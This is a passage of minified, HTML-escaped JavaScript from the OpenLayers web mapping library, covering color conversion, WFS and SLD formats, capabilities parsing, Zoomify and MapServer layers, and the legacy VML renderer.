c=1;4&gt;c;c++)a+=b.charAt(c)+b.charAt(c)&#125;0==a.indexOf("#")&amp;&amp;(a=a.substring(1));b=a.substring(0,2);c=a.substring(2,4);a=a.substring(4,6);return new OpenLayers.Rico.Color(parseInt(b,16),parseInt(c,16),parseInt(a,16))&#125;;OpenLayers.Rico.Color.createColorFromBackground=function(a)&#123;var b=OpenLayers.Element.getStyle(OpenLayers.Util.getElement(a),"backgroundColor");return"transparent"==b&amp;&amp;a.parentNode?OpenLayers.Rico.Color.createColorFromBackground(a.parentNode):null==b?new OpenLayers.Rico.Color(255,255,255):0==b.indexOf("rgb(")?(a=b.substring(4,b.length-1).split(","),new OpenLayers.Rico.Color(parseInt(a[0]),parseInt(a[1]),parseInt(a[2]))):0==b.indexOf("#")?OpenLayers.Rico.Color.createFromHex(b):new OpenLayers.Rico.Color(255,255,255)&#125;;OpenLayers.Rico.Color.HSBtoRGB=function(a,b,c)&#123;var d=0,e=0,f=0;if(0==b)f=e=d=parseInt(255*c+0.5);else&#123;a=6*(a-Math.floor(a));var g=a-Math.floor(a),h=c*(1-b),k=c*(1-b*g);b=c*(1-b*(1-g));switch(parseInt(a))&#123;case 0:d=255*c+0.5;e=255*b+0.5;f=255*h+0.5;break;case 1:d=255*k+0.5;e=255*c+0.5;f=255*h+0.5;break;case 2:d=255*h+0.5;e=255*c+0.5;f=255*b+0.5;break;case 3:d=255*h+0.5;e=255*k+0.5;f=255*c+0.5;break;case 4:d=255*b+0.5;e=255*h+0.5;f=255*c+0.5;break;case 5:d=255*c+0.5,e=255*h+0.5,f=255*k+0.5&#125;&#125;return&#123;r:parseInt(d),g:parseInt(e),b:parseInt(f)&#125;&#125;;OpenLayers.Rico.Color.RGBtoHSB=function(a,b,c)&#123;var d,e=a&gt;b?a:b;c&gt;e&amp;&amp;(e=c);var f=a&lt;b?a:b;c&lt;f&amp;&amp;(f=c);d=0!=e?(e-f)/e:0;if(0==d)a=0;else&#123;var g=(e-a)/(e-f),h=(e-b)/(e-f);c=(e-c)/(e-f);a=(a==e?c-h:b==e?2+g-c:4+h-g)/6;0&gt;a&amp;&amp;(a+=1)&#125;return&#123;h:a,s:d,b:e/255&#125;&#125;;OpenLayers.Style2=OpenLayers.Class(&#123;id:null,name:null,title:null,description:null,layerName:null,isDefault:!1,rules:null,initialize:function(a)&#123;OpenLayers.Util.extend(this,a);this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")&#125;,destroy:function()&#123;for(var a=0,b=this.rules.length;a&lt;b;a++)this.rules[a].destroy();delete this.rules&#125;,clone:function()&#123;var a=OpenLayers.Util.extend(&#123;&#125;,this);if(this.rules)&#123;a.rules=[];for(var b=0,c=this.rules.length;b&lt;c;++b)a.rules.push(this.rules[b].clone())&#125;return new OpenLayers.Style2(a)&#125;,CLASS_NAME:"OpenLayers.Style2"&#125;);OpenLayers.Format.WFS=OpenLayers.Class(OpenLayers.Format.GML,&#123;layer:null,wfsns:"http://www.opengis.net/wfs",ogcns:"http://www.opengis.net/ogc",initialize:function(a,b)&#123;OpenLayers.Format.GML.prototype.initialize.apply(this,[a]);this.layer=b;this.layer.featureNS&amp;&amp;(this.featureNS=this.layer.featureNS);this.layer.options.geometry_column&amp;&amp;(this.geometryName=this.layer.options.geometry_column);this.layer.options.typename&amp;&amp;(this.featureName=this.layer.options.typename)&#125;,write:function(a)&#123;var b=this.createElementNS(this.wfsns,"wfs:Transaction");b.setAttribute("version","1.0.0");b.setAttribute("service","WFS");for(var c=0;c&lt;a.length;c++)switch(a[c].state)&#123;case OpenLayers.State.INSERT:b.appendChild(this.insert(a[c]));break;case OpenLayers.State.UPDATE:b.appendChild(this.update(a[c]));break;case OpenLayers.State.DELETE:b.appendChild(this.remove(a[c]))&#125;return OpenLayers.Format.XML.prototype.write.apply(this,[b])&#125;,createFeatureXML:function(a)&#123;var b=this.buildGeometryNode(a.geometry),c=this.createElementNS(this.featureNS,"feature:"+this.geometryName);c.appendChild(b);b=this.createElementNS(this.featureNS,"feature:"+this.featureName);b.appendChild(c);for(var d in a.attributes)&#123;var c=this.createTextNode(a.attributes[d]),e=d;-1!=d.search(":")&amp;&amp;(e=d.split(":")[1]);e=this.createElementNS(this.featureNS,"feature:"+e);e.appendChild(c);b.appendChild(e)&#125;return b&#125;,insert:function(a)&#123;var b=this.createElementNS(this.wfsns,"wfs:Insert");b.appendChild(this.createFeatureXML(a));return b&#125;,update:function(a)&#123;a.fid||OpenLayers.Console.userError(OpenLayers.i18n("noFID"));var b=this.createElementNS(this.wfsns,"wfs:Update");b.setAttribute("typeName",this.featurePrefix+":"+this.featureName);b.setAttribute("xmlns:"+this.featurePrefix,this.featureNS);var c=this.createElementNS(this.wfsns,"wfs:Property"),d=this.createElementNS(this.wfsns,"wfs:Name"),e=this.createTextNode(this.geometryName);d.appendChild(e);c.appendChild(d);d=this.createElementNS(this.wfsns,"wfs:Value");e=this.buildGeometryNode(a.geometry);a.layer&amp;&amp;e.setAttribute("srsName",a.layer.projection.getCode());d.appendChild(e);c.appendChild(d);b.appendChild(c);for(var f in a.attributes)c=this.createElementNS(this.wfsns,"wfs:Property"),d=this.createElementNS(this.wfsns,"wfs:Name"),d.appendChild(this.createTextNode(f)),c.appendChild(d),d=this.createElementNS(this.wfsns,"wfs:Value"),d.appendChild(this.createTextNode(a.attributes[f])),c.appendChild(d),b.appendChild(c);c=this.createElementNS(this.ogcns,"ogc:Filter");f=this.createElementNS(this.ogcns,"ogc:FeatureId");f.setAttribute("fid",a.fid);c.appendChild(f);b.appendChild(c);return b&#125;,remove:function(a)&#123;if(!a.fid)return OpenLayers.Console.userError(OpenLayers.i18n("noFID")),!1;var b=this.createElementNS(this.wfsns,"wfs:Delete");b.setAttribute("typeName",this.featurePrefix+":"+this.featureName);b.setAttribute("xmlns:"+this.featurePrefix,this.featureNS);var c=this.createElementNS(this.ogcns,"ogc:Filter"),d=this.createElementNS(this.ogcns,"ogc:FeatureId");d.setAttribute("fid",a.fid);c.appendChild(d);b.appendChild(c);return b&#125;,destroy:function()&#123;this.layer=null&#125;,CLASS_NAME:"OpenLayers.Format.WFS"&#125;);OpenLayers.Format.SLD.v1_0_0_GeoServer=OpenLayers.Class(OpenLayers.Format.SLD.v1_0_0,&#123;version:"1.0.0",profile:"GeoServer",readers:OpenLayers.Util.applyDefaults(&#123;sld:OpenLayers.Util.applyDefaults(&#123;Priority:function(a,b)&#123;var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.priority=c)&#125;,VendorOption:function(a,b)&#123;b.vendorOptions||(b.vendorOptions=&#123;&#125;);b.vendorOptions[a.getAttribute("name")]=this.getChildValue(a)&#125;,TextSymbolizer:function(a,b)&#123;OpenLayers.Format.SLD.v1_0_0.prototype.readers.sld.TextSymbolizer.apply(this,arguments);var c=this.multipleSymbolizers?b.symbolizers[b.symbolizers.length-1]:b.symbolizer.Text;void 0===c.graphic&amp;&amp;(c.graphic=!1)&#125;&#125;,OpenLayers.Format.SLD.v1_0_0.prototype.readers.sld)&#125;,OpenLayers.Format.SLD.v1_0_0.prototype.readers),writers:OpenLayers.Util.applyDefaults(&#123;sld:OpenLayers.Util.applyDefaults(&#123;Priority:function(a)&#123;return this.writers.sld._OGCExpression.call(this,"sld:Priority",a)&#125;,VendorOption:function(a)&#123;return this.createElementNSPlus("sld:VendorOption",&#123;attributes:&#123;name:a.name&#125;,value:a.value&#125;)&#125;,TextSymbolizer:function(a)&#123;var b=OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld.TextSymbolizer.apply(this,arguments);!1!==a.graphic&amp;&amp;(a.externalGraphic||a.graphicName)&amp;&amp;this.writeNode("Graphic",a,b);"priority"in a&amp;&amp;this.writeNode("Priority",a.priority,b);return this.addVendorOptions(b,a)&#125;,PointSymbolizer:function(a)&#123;var b=OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld.PointSymbolizer.apply(this,arguments);return this.addVendorOptions(b,a)&#125;,LineSymbolizer:function(a)&#123;var b=OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld.LineSymbolizer.apply(this,arguments);return this.addVendorOptions(b,a)&#125;,PolygonSymbolizer:function(a)&#123;var b=OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld.PolygonSymbolizer.apply(this,arguments);return this.addVendorOptions(b,a)&#125;&#125;,OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld)&#125;,OpenLayers.Format.SLD.v1_0_0.prototype.writers),addVendorOptions:function(a,b)&#123;if(b.vendorOptions)for(var c in b.vendorOptions)this.writeNode("VendorOption",&#123;name:c,value:b.vendorOptions[c]&#125;,a);return a&#125;,CLASS_NAME:"OpenLayers.Format.SLD.v1_0_0_GeoServer"&#125;);OpenLayers.Layer.Boxes=OpenLayers.Class(OpenLayers.Layer.Markers,&#123;drawMarker:function(a)&#123;var b=this.map.getLayerPxFromLonLat(&#123;lon:a.bounds.left,lat:a.bounds.top&#125;),c=this.map.getLayerPxFromLonLat(&#123;lon:a.bounds.right,lat:a.bounds.bottom&#125;);null==c||null==b?a.display(!1):(b=a.draw(b,&#123;w:Math.max(1,c.x-b.x),h:Math.max(1,c.y-b.y)&#125;),a.drawn||(this.div.appendChild(b),a.drawn=!0))&#125;,removeMarker:function(a)&#123;OpenLayers.Util.removeItem(this.markers,a);null!=a.div&amp;&amp;a.div.parentNode==this.div&amp;&amp;this.div.removeChild(a.div)&#125;,CLASS_NAME:"OpenLayers.Layer.Boxes"&#125;);OpenLayers.Format.WFSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.WFSCapabilities.v1,&#123;readers:&#123;wfs:OpenLayers.Util.applyDefaults(&#123;Service:function(a,b)&#123;b.service=&#123;&#125;;this.readChildNodes(a,b.service)&#125;,Fees:function(a,b)&#123;var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.fees=c)&#125;,AccessConstraints:function(a,b)&#123;var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.accessConstraints=c)&#125;,OnlineResource:function(a,b)&#123;var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.onlineResource=c)&#125;,Keywords:function(a,b)&#123;var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.keywords=c.split(", "))&#125;,Capability:function(a,b)&#123;b.capability=&#123;&#125;;this.readChildNodes(a,b.capability)&#125;,Request:function(a,b)&#123;b.request=&#123;&#125;;this.readChildNodes(a,b.request)&#125;,GetFeature:function(a,b)&#123;b.getfeature=&#123;href:&#123;&#125;,formats:[]&#125;;this.readChildNodes(a,b.getfeature)&#125;,ResultFormat:function(a,b)&#123;for(var c=a.childNodes,d,e=0;e&lt;c.length;e++)d=c[e],1==d.nodeType&amp;&amp;b.formats.push(d.nodeName)&#125;,DCPType:function(a,b)&#123;this.readChildNodes(a,b)&#125;,HTTP:function(a,b)&#123;this.readChildNodes(a,b.href)&#125;,Get:function(a,b)&#123;b.get=a.getAttribute("onlineResource")&#125;,Post:function(a,b)&#123;b.post=a.getAttribute("onlineResource")&#125;,SRS:function(a,b)&#123;var c=this.getChildValue(a);c&amp;&amp;(b.srs=c)&#125;&#125;,OpenLayers.Format.WFSCapabilities.v1.prototype.readers.wfs)&#125;,CLASS_NAME:"OpenLayers.Format.WFSCapabilities.v1_0_0"&#125;);OpenLayers.Format.WMSCapabilities.v1_3=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1,&#123;readers:&#123;wms:OpenLayers.Util.applyDefaults(&#123;WMS_Capabilities:function(a,b)&#123;this.readChildNodes(a,b)&#125;,LayerLimit:function(a,b)&#123;b.layerLimit=parseInt(this.getChildValue(a))&#125;,MaxWidth:function(a,b)&#123;b.maxWidth=parseInt(this.getChildValue(a))&#125;,MaxHeight:function(a,b)&#123;b.maxHeight=parseInt(this.getChildValue(a))&#125;,BoundingBox:function(a,b)&#123;var c=OpenLayers.Format.WMSCapabilities.v1.prototype.readers.wms.BoundingBox.apply(this,[a,b]);c.srs=a.getAttribute("CRS");b.bbox[c.srs]=c&#125;,CRS:function(a,b)&#123;this.readers.wms.SRS.apply(this,[a,b])&#125;,EX_GeographicBoundingBox:function(a,b)&#123;b.llbbox=[];this.readChildNodes(a,b.llbbox)&#125;,westBoundLongitude:function(a,b)&#123;b[0]=this.getChildValue(a)&#125;,eastBoundLongitude:function(a,b)&#123;b[2]=this.getChildValue(a)&#125;,southBoundLatitude:function(a,b)&#123;b[1]=this.getChildValue(a)&#125;,northBoundLatitude:function(a,b)&#123;b[3]=this.getChildValue(a)&#125;,MinScaleDenominator:function(a,b)&#123;b.maxScale=parseFloat(this.getChildValue(a)).toPrecision(16)&#125;,MaxScaleDenominator:function(a,b)&#123;b.minScale=parseFloat(this.getChildValue(a)).toPrecision(16)&#125;,Dimension:function(a,b)&#123;var c=&#123;name:a.getAttribute("name").toLowerCase(),units:a.getAttribute("units"),unitsymbol:a.getAttribute("unitSymbol"),nearestVal:"1"===a.getAttribute("nearestValue"),multipleVal:"1"===a.getAttribute("multipleValues"),"default":a.getAttribute("default")||"",current:"1"===a.getAttribute("current"),values:this.getChildValue(a).split(",")&#125;;b.dimensions[c.name]=c&#125;,Keyword:function(a,b)&#123;var c=&#123;value:this.getChildValue(a),vocabulary:a.getAttribute("vocabulary")&#125;;b.keywords&amp;&amp;b.keywords.push(c)&#125;&#125;,OpenLayers.Format.WMSCapabilities.v1.prototype.readers.wms),sld:&#123;UserDefinedSymbolization:function(a,b)&#123;this.readers.wms.UserDefinedSymbolization.apply(this,[a,b]);b.userSymbols.inlineFeature=1==parseInt(a.getAttribute("InlineFeature"));b.userSymbols.remoteWCS=1==parseInt(a.getAttribute("RemoteWCS"))&#125;,DescribeLayer:function(a,b)&#123;this.readers.wms.DescribeLayer.apply(this,[a,b])&#125;,GetLegendGraphic:function(a,b)&#123;this.readers.wms.GetLegendGraphic.apply(this,[a,b])&#125;&#125;&#125;,CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_3"&#125;);OpenLayers.Layer.Zoomify=OpenLayers.Class(OpenLayers.Layer.Grid,&#123;size:null,isBaseLayer:!0,standardTileSize:256,tileOriginCorner:"tl",numberOfTiers:0,tileCountUpToTier:null,tierSizeInTiles:null,tierImageSize:null,initialize:function(a,b,c,d)&#123;this.initializeZoomify(c);OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a,b,c,&#123;&#125;,d])&#125;,initializeZoomify:function(a)&#123;var b=a.clone();this.size=a.clone();a=new OpenLayers.Size(Math.ceil(b.w/this.standardTileSize),Math.ceil(b.h/this.standardTileSize));this.tierSizeInTiles=[a];for(this.tierImageSize=[b];b.w&gt;this.standardTileSize||b.h&gt;this.standardTileSize;)b=new OpenLayers.Size(Math.floor(b.w/2),Math.floor(b.h/2)),a=new OpenLayers.Size(Math.ceil(b.w/this.standardTileSize),Math.ceil(b.h/this.standardTileSize)),this.tierSizeInTiles.push(a),this.tierImageSize.push(b);this.tierSizeInTiles.reverse();this.tierImageSize.reverse();this.numberOfTiers=this.tierSizeInTiles.length;b=[1];this.tileCountUpToTier=[0];for(a=1;a&lt;this.numberOfTiers;a++)b.unshift(Math.pow(2,a)),this.tileCountUpToTier.push(this.tierSizeInTiles[a-1].w*this.tierSizeInTiles[a-1].h+this.tileCountUpToTier[a-1]);this.serverResolutions||(this.serverResolutions=b)&#125;,destroy:function()&#123;OpenLayers.Layer.Grid.prototype.destroy.apply(this,arguments);this.tileCountUpToTier.length=0;this.tierSizeInTiles.length=0;this.tierImageSize.length=0&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.Zoomify(this.name,this.url,this.size,this.options));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])&#125;,getURL:function(a)&#123;a=this.adjustBounds(a);var b=this.getServerResolution(),c=Math.round((a.left-this.tileOrigin.lon)/(b*this.tileSize.w));a=Math.round((this.tileOrigin.lat-a.top)/(b*this.tileSize.h));b=this.getZoomForResolution(b);c="TileGroup"+Math.floor((c+a*this.tierSizeInTiles[b].w+this.tileCountUpToTier[b])/256)+"/"+b+"-"+c+"-"+a+".jpg";b=this.url;OpenLayers.Util.isArray(b)&amp;&amp;(b=this.selectUrl(c,b));return b+c&#125;,getImageSize:function()&#123;if(0&lt;arguments.length)&#123;var a=this.adjustBounds(arguments[0]),b=this.getServerResolution(),c=Math.round((a.left-this.tileOrigin.lon)/(b*this.tileSize.w)),a=Math.round((this.tileOrigin.lat-a.top)/(b*this.tileSize.h)),b=this.getZoomForResolution(b),d=this.standardTileSize,e=this.standardTileSize;c==this.tierSizeInTiles[b].w-1&amp;&amp;(d=this.tierImageSize[b].w%this.standardTileSize);a==this.tierSizeInTiles[b].h-1&amp;&amp;(e=this.tierImageSize[b].h%this.standardTileSize);return new OpenLayers.Size(d,e)&#125;return this.tileSize&#125;,setMap:function(a)&#123;OpenLayers.Layer.Grid.prototype.setMap.apply(this,arguments);this.tileOrigin=new OpenLayers.LonLat(this.map.maxExtent.left,this.map.maxExtent.top)&#125;,CLASS_NAME:"OpenLayers.Layer.Zoomify"&#125;);OpenLayers.Layer.MapServer=OpenLayers.Class(OpenLayers.Layer.Grid,&#123;DEFAULT_PARAMS:&#123;mode:"map",map_imagetype:"png"&#125;,initialize:function(a,b,c,d)&#123;OpenLayers.Layer.Grid.prototype.initialize.apply(this,arguments);this.params=OpenLayers.Util.applyDefaults(this.params,this.DEFAULT_PARAMS);if(null==d||null==d.isBaseLayer)this.isBaseLayer="true"!=this.params.transparent&amp;&amp;!0!=this.params.transparent&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.MapServer(this.name,this.url,this.params,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])&#125;,getURL:function(a)&#123;a=this.adjustBounds(a);a=[a.left,a.bottom,a.right,a.top];var b=this.getImageSize();return this.getFullRequestString(&#123;mapext:a,imgext:a,map_size:[b.w,b.h],imgx:b.w/2,imgy:b.h/2,imgxy:[b.w,b.h]&#125;)&#125;,getFullRequestString:function(a,b)&#123;var c=null==b?this.url:b,d=OpenLayers.Util.extend(&#123;&#125;,this.params),d=OpenLayers.Util.extend(d,a),e=OpenLayers.Util.getParameterString(d);OpenLayers.Util.isArray(c)&amp;&amp;(c=this.selectUrl(e,c));var e=OpenLayers.Util.upperCaseObject(OpenLayers.Util.getParameters(c)),f;for(f in d)f.toUpperCase()in e&amp;&amp;delete d[f];e=OpenLayers.Util.getParameterString(d);d=c;e=e.replace(/,/g,"+");""!=e&amp;&amp;(f=c.charAt(c.length-1),d="&amp;"==f||"?"==f?d+e:-1==c.indexOf("?")?d+("?"+e):d+("&amp;"+e));return d&#125;,CLASS_NAME:"OpenLayers.Layer.MapServer"&#125;);OpenLayers.Renderer.VML=OpenLayers.Class(OpenLayers.Renderer.Elements,&#123;xmlns:"urn:schemas-microsoft-com:vml",symbolCache:&#123;&#125;,offset:null,initialize:function(a)&#123;if(this.supported())&#123;if(!document.namespaces.olv)&#123;document.namespaces.add("olv",this.xmlns);for(var b=document.createStyleSheet(),c="shape rect oval fill stroke imagedata group textbox".split(" "),d=0,e=c.length;d&lt;e;d++)b.addRule("olv\\:"+c[d],"behavior: url(#default#VML); position: absolute; display: inline-block;")&#125;OpenLayers.Renderer.Elements.prototype.initialize.apply(this,arguments)&#125;&#125;,supported:function()&#123;return!!document.namespaces&#125;,setExtent:function(a,b)&#123;var c=OpenLayers.Renderer.Elements.prototype.setExtent.apply(this,arguments),d=this.getResolution(),e=a.left/d|0,d=a.top/d-this.size.h|0;b||!this.offset?(this.offset=&#123;x:e,y:d&#125;,d=e=0):(e-=this.offset.x,d-=this.offset.y);this.root.coordorigin=e-this.xOffset+" "+d;for(var e=[this.root,this.vectorRoot,this.textRoot],f=0,g=e.length;f&lt;g;++f)d=e[f],d.coordsize=this.size.w+" "+this.size.h;this.root.style.flip="y";return c&#125;,setSize:function(a)&#123;OpenLayers.Renderer.prototype.setSize.apply(this,arguments);for(var b=[this.rendererRoot,this.root,this.vectorRoot,this.textRoot],c=this.size.w+"px",d=this.size.h+"px",e,f=0,g=b.length;f&lt;g;++f)e=b[f],e.style.width=c,e.style.height=d&#125;,getNodeType:function(a,b)&#123;var c=null;switch(a.CLASS_NAME)&#123;case "OpenLayers.Geometry.Point":c=b.externalGraphic?"olv:rect":this.isComplexSymbol(b.graphicName)?"olv:shape":"olv:oval";break;case "OpenLayers.Geometry.Rectangle":c="olv:rect";break;case "OpenLayers.Geometry.LineString":case "OpenLayers.Geometry.LinearRing":case "OpenLayers.Geometry.Polygon":case "OpenLayers.Geometry.Curve":c="olv:shape"&#125;return c&#125;,setStyle:function(a,b,c,d)&#123;b=b||a._style;c=c||a._options;var e=b.fillColor,f=b.title||b.graphicTitle;f&amp;&amp;(a.title=f);if("OpenLayers.Geometry.Point"===a._geometryClass)if(b.externalGraphic)&#123;c.isFilled=!0;var e=b.graphicWidth||b.graphicHeight,f=b.graphicHeight||b.graphicWidth,e=e?e:2*b.pointRadius,f=f?f:2*b.pointRadius,g=this.getResolution(),h=void 0!=b.graphicXOffset?b.graphicXOffset:-(0.5*e),k=void 0!=b.graphicYOffset?b.graphicYOffset:-(0.5*f);a.style.left=((d.x-this.featureDx)/g-this.offset.x+h|0)+"px";a.style.top=(d.y/g-this.offset.y-(k+f)|0)+"px";a.style.width=e+"px";a.style.height=f+"px";a.style.flip="y";e="none";c.isStroked=!1&#125;else this.isComplexSymbol(b.graphicName)?(f=this.importSymbol(b.graphicName),a.path=f.path,a.coordorigin=f.left+","+f.bottom,f=f.size,a.coordsize=f+","+f,this.drawCircle(a,d,b.pointRadius),a.style.flip="y"):this.drawCircle(a,d,b.pointRadius);c.isFilled?a.fillcolor=e:a.filled="false";d=a.getElementsByTagName("fill");d=0==d.length?null:d[0];c.isFilled?(d||(d=this.createNode("olv:fill",a.id+"_fill")),d.opacity=b.fillOpacity,"OpenLayers.Geometry.Point"===a._geometryClass&amp;&amp;b.externalGraphic&amp;&amp;(b.graphicOpacity&amp;&amp;(d.opacity=b.graphicOpacity),d.src=b.externalGraphic,d.type="frame",b.graphicWidth&amp;&amp;b.graphicHeight||(d.aspect="atmost")),d.parentNode!=a&amp;&amp;a.appendChild(d)):d&amp;&amp;a.removeChild(d);e=b.rotation;if(void 0!==e||void 0!==a._rotation)a._rotation=e,b.externalGraphic?(this.graphicRotate(a,h,k,b),d.opacity=0):"OpenLayers.Geometry.Point"===a._geometryClass&amp;&amp;(a.style.rotation=e||0);h=a.getElementsByTagName("stroke");h=0==h.length?null:h[0];c.isStroked?(h||(h=this.createNode("olv:stroke",a.id+"_stroke"),a.appendChild(h)),h.on=!0,h.color=b.strokeColor,h.weight=b.strokeWidth+"px",h.opacity=b.strokeOpacity,h.endcap="butt"==b.strokeLinecap?"flat":b.strokeLinecap||"round",b.strokeDashstyle&amp;&amp;(h.dashstyle=this.dashStyle(b))):(a.stroked=!1,h&amp;&amp;(h.on=!1));"inherit"!=b.cursor&amp;&amp;null!=b.cursor&amp;&amp;(a.style.cursor=b.cursor);return a&#125;,graphicRotate:function(a,b,c,d)&#123;d=d||a._style;var e=d.rotation||0,f,g;if(d.graphicWidth&amp;&amp;d.graphicHeight)&#123;g=Math.max(d.graphicWidth,d.graphicHeight);f=d.graphicWidth/d.graphicHeight;var h=Math.round(d.graphicWidth||g*f),k=Math.round(d.graphicHeight||g);a.style.width=h+"px";a.style.height=k+"px";var l=document.getElementById(a.id+"_image");l||(l=this.createNode("olv:imagedata",a.id+"_image"),a.appendChild(l));l.style.width=h+"px";l.style.height=k+"px";l.src=d.externalGraphic;l.style.filter="progid:DXImageTransform.Microsoft.AlphaImageLoader(src='', sizingMethod='scale')";l=e*Math.PI/180;e=Math.sin(l);l=Math.cos(l);e="progid:DXImageTransform.Microsoft.Matrix(M11="+l+",M12="+-e+",M21="+e+",M22="+l+",SizingMethod='auto expand')\n";(l=d.graphicOpacity||d.fillOpacity)&amp;&amp;1!=l&amp;&amp;(e+="progid:DXImageTransform.Microsoft.BasicImage(opacity="+l+")\n");a.style.filter=e;e=new OpenLayers.Geometry.Point(-b,-c);h=(new OpenLayers.Bounds(0,0,h,k)).toGeometry();h.rotate(d.rotation,e);h=h.getBounds();a.style.left=Math.round(parseInt(a.style.left)+h.left)+"px";a.style.top=Math.round(parseInt(a.style.top)-h.bottom)+"px"&#125;else&#123;var m=new Image;m.onreadystatechange=OpenLayers.Function.bind(function()&#123;if("complete"==m.readyState||"interactive"==m.readyState)f=m.width/m.height,g=Math.max(2*d.pointRadius,d.graphicWidth||0,d.graphicHeight||0),b*=f,d.graphicWidth=g*f,d.graphicHeight=g,this.graphicRotate(a,b,c,d)&#125;,this);m.src=d.externalGraphic&#125;&#125;,postDraw:function(a)&#123;a.style.visibility="visible";var b=a._style.fillColor,c=a._style.strokeColor;"none"==b&amp;&amp;a.fillcolor!=b&amp;&amp;(a.fillcolor=b);"none"==c&amp;&amp;a.strokecolor!=c&amp;&amp;(a.strokecolor=c)&#125;,setNodeDimension:function(a,b)&#123;var c=b.getBounds();if(c)&#123;var d=this.getResolution(),c=new OpenLayers.Bounds((c.left-this.featureDx)/d-this.offset.x|0,c.bottom/d-this.offset.y|0,(c.right-this.featureDx)/d-this.offset.x|0,c.top/d-this.offset.y|0);a.style.left=c.left+"px";a.style.top=c.top+"px";a.style.width=c.getWidth()+"px";a.style.height=c.getHeight()+"px";a.coordorigin=c.left+" "+c.top;a.coordsize=c.getWidth()+" "+c.getHeight()&#125;&#125;,dashStyle:function(a)&#123;a=a.strokeDashstyle;switch(a)&#123;case "solid":case "dot":case "dash":case "dashdot":case "longdash":case "longdashdot":return a;default:return a=a.split(/[ ,]/),2==a.length?1*a[0]&gt;=2*a[1]?"longdash":1==a[0]||1==a[1]?"dot":"dash":4==a.length?1*a[0]&gt;=2*a[1]?"longdashdot":"dashdot":"solid"&#125;&#125;,createNode:function(a,b)&#123;var c=document.createElement(a);b&amp;&amp;(c.id=b);c.unselectable="on";c.onselectstart=OpenLayers.Function.False;return c&#125;,nodeTypeCompare:function(a,b)&#123;var c=b,d=c.indexOf(":");-1!=d&amp;&amp;(c=c.substr(d+1));var e=a.nodeName,d=e.indexOf(":");-1!=d&amp;&amp;(e=e.substr(d+1));return c==e&#125;,createRenderRoot:function()&#123;return this.nodeFactory(this.container.id+"_vmlRoot","div")&#125;,createRoot:function(a)&#123;return this.nodeFactory(this.container.id+a,"olv:group")&#125;,drawPoint:function(a,b)&#123;return this.drawCircle(a,b,1)&#125;,drawCircle:function(a,b,c)&#123;if(!isNaN(b.x)&amp;&amp;!isNaN(b.y))&#123;var d=this.getResolution();a.style.left=((b.x-this.featureDx)/d-this.offset.x|0)-c+"px";a.style.top=(b.y/d-this.offset.y|0)-c+"px";b=2*c;a.style.width=b+"px";a.style.height=b+"px";return a&#125;return!1&#125;,drawLineString:function(a,b)&#123;return this.drawLine(a,b,!1)&#125;,drawLinearRing:function(a,b)&#123;return this.drawLine(a,b,!0)&#125;,drawLine:function(a,b,c)&#123;this.setNodeDimension(a,b);for(var d=this.getResolution(),e=b.components.length,f=Array(e),g,h,k=0;k&lt;e;k++)g=b.components[k],h=(g.x-this.featureDx)/d-this.offset.x|0,g=g.y/d-this.offset.y|0,f[k]=" "+h+","+g+" l ";b=c?" x e":" e";a.path="m"+f.join("")+b;return a&#125;,drawPolygon:function(a,b)&#123;this.setNodeDimension(a,b);var c=this.getResolution(),d=[],e,f,g,h,k,l,m,n,p,q;e=0;for(f=b.components.length;e&lt;f;e++)&#123;d.push("m");g=b.components[e].components;h=0===e;l=k=null;m=0;for(n=g.length;m&lt;n;m++)p=g[m],q=(p.x-this.featureDx)/c-this.offset.x|0,p=p.y/c-this.offset.y|0,q=" "+q+","+p,d.push(q),0==m&amp;&amp;d.push(" l"),h||(k?k!=q&amp;&amp;(l?l!=q&amp;&amp;(h=!0):l=q):k=q);d.push(h?" x ":" ")&#125;d.push("e");a.path=d.join("");return a&#125;,drawRectangle:function(a,b)&#123;var c=this.getResolution();a.style.left=((b.x-this.featureDx)/c-this.offset.x|0)+"px";a.style.top=(b.y/c-this.offset.y|0)+"px";a.style.width=(b.width/c|0)+"px";a.style.height=(b.height/c|0)+"px";return a&#125;,drawText:function(a,b,c)&#123;var d=this.nodeFactory(a+this.LABEL_ID_SUFFIX,"olv:rect"),e=this.nodeFactory(a+this.LABEL_ID_SUFFIX+"_textbox","olv:textbox"),f=this.getResolution();d.style.left=((c.x-this.featureDx)/f-this.offset.x|0)+"px";d.style.top=(c.y/f-this.offset.y|0)+"px";d.style.flip="y";e.innerText=b.label;"inherit"!=b.cursor&amp;&amp;null!=b.cursor&amp;&amp;(e.style.cursor=b.cursor);b.fontColor&amp;&amp;(e.style.color=b.fontColor);b.fontOpacity&amp;&amp;(e.style.filter="alpha(opacity="+100*b.fontOpacity+")");b.fontFamily&amp;&amp;(e.style.fontFamily=b.fontFamily);b.fontSize&amp;&amp;(e.style.fontSize=b.fontSize);b.fontWeight&amp;&amp;(e.style.fontWeight=b.fontWeight);b.fontStyle&amp;&amp;(e.style.fontStyle=b.fontStyle);!0===b.labelSelect&amp;&amp;(d._featureId=a,e._featureId=a,e._geometry=c,e._geometryClass=c.CLASS_NAME);e.style.whiteSpace="nowrap";e.inset="1px,0px,0px,0px";d.parentNode||(d.appendChild(e),this.textRoot.appendChild(d));b=b.labelAlign||"cm";1==b.length&amp;&amp;(b+="m");a=e.clientWidth*OpenLayers.Renderer.VML.LABEL_SHIFT[b.substr(0,1)];e=e.clientHeight*OpenLayers.Renderer.VML.LABEL_SHIFT[b.substr(1,1)];d